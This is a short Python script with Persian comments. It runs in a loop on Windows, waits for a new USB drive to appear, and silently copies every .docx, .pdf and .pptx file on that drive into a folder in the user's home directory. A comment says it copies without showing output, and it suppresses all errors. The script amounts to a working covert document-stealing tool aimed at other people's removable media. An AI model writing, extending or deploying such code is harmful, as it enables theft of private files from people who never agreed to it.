import os
import shutil
import time

# تابع برای پیدا کردن درایوهای موجود در سیستم
def get_current_drives():
    drives = []
    if os.name == 'nt':
        import ctypes
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if bitmask & (1 << i):
                drives.append(f'{chr(65 + i)}:')
    return drives

# تابع اصلی برای جستجو و کپی فایل‌ها
def copy_files_from_usb():
    destination_folder = os.path.join(os.path.expanduser('~'), 'Copied_USB_Files')
    
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)
    
    file_extensions = ('.docx', '.pdf', '.pptx')
    
    initial_drives = set(get_current_drives())
    
    while True:
        current_drives = set(get_current_drives())
        new_drives = current_drives - initial_drives
        
        if new_drives:
            new_usb_drive = list(new_drives)[0]

            for root, dirs, files in os.walk(new_usb_drive):
                for file in files:
                    if file.endswith(file_extensions):
                        source_path = os.path.join(root, file)
                        destination_path = os.path.join(destination_folder, file)
                        
                        try:
                            # کپی کردن فایل بدون نمایش خروجی
                            shutil.copy2(source_path, destination_path)
                        except Exception:
                            # می‌توانید خطاها را در یک فایل log ثبت کنید
                            pass
            
            initial_drives = current_drives
            
        time.sleep(5)

if __name__ == "__main__":
    copy_files_from_usb()